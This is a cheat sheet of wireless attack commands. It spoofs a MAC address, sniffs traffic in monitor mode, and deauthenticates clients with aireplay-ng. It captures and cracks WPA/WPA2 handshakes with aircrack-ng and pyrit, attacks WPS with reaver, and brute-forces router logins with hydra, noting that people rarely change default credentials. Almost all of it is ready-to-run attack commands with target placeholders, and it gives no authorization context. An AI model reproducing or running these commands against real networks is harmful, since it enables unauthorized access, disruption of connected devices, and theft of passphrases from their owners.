---------- Change MAC Address ----------

# view interfaces
iwconfig
 
# disable card
ifconfig wlan1 down
 
# get a new random MAC address
macchanger --random wlan1
 
# enable card
ifconfig wlan1 up



---------- Enable Monitor Mode ----------

# kill these processes BEFORE putting the card in monitor mode
airmon-ng check kill
 
# enable monitor mode
airmon-ng start wlan1



---------- Disable Monitor Mode ----------

# take card out of monitor mode
airmon-ng stop wlan0mon

# restart network manager
service network-manager start



---------- Find and Sniff Network ----------

# find the network that we want
airodump-ng wlan1mon

# sniff and save packets
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan1mon



---------- Deauth Attack ----------

# find the devices on a network
airodump-ng --bssid <AP MAC> --channel <#> wlan1mon

# send deauth packets
aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan1mon



---------- Crack WPA / WPA2 Passphrase ----------

# capture handshake
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan1mon

# loop through passwords
aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt

# decrypt packets
airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap



---------- Use pyrit for Faster Cracking ----------

pyrit list_cores
pyrit -r <CAPTURE FILE> analyze
pyrit eval
pyrit -i <PASS FILE> import_passwords

#Note: If you want to import more passwords, just use the same command with a different filename

pyrit -e HOMEWIFI create_essid
pyrit eval

# Pyrit has automatically filtered passwords that are not suitable for WPA(2)-PSK and also sorted out duplicates

pyrit batch
pyrit -r <CAPTURE FILE> attack_db

# Delete ESSID from database
pyrit -e HOMEWIFI delete_essid

# Delete passwords
rm -rf .pyrit/blobspace/password/



---------- WPS Pin Recovery ----------

# Can scan and find WPS enabled access points
wash -i wlan1mon

-i = interface
-b = BSSID
-c = channel
-f = fixed (disable channel hopping)
-a = auto detect best advanced options for target AP
-w = mimic Windows 7 registrar
- v = very verbose (-vv for even more)

-K 1 = pixiewps mode enabled

# Reaver is tool used to attack WPS
reaver -i wlan1mon -b <AP MAC> -c 6 -f -a -w -vv -K 1



---------- Crack Router Login ----------

# Make sure card is in monitor mode
airmon-ng check kill
airmon-ng start wlan1

Go to http://192.168.0.1/ (you must be on the network)
Look what type of router they have and Google the default credentials
Most people don't change their default settings

# Tries null and user name for password too
-e ns

# Exit when login is found
-F

# Displays the results in the terminal
-V

# Number of parallel tasks to run
-t 4

hydra http://[192.168.0.1]/login.html -e ns -F -V -t 4 -L <USERNAMES FILE> -P <PASSWORDS FILE>


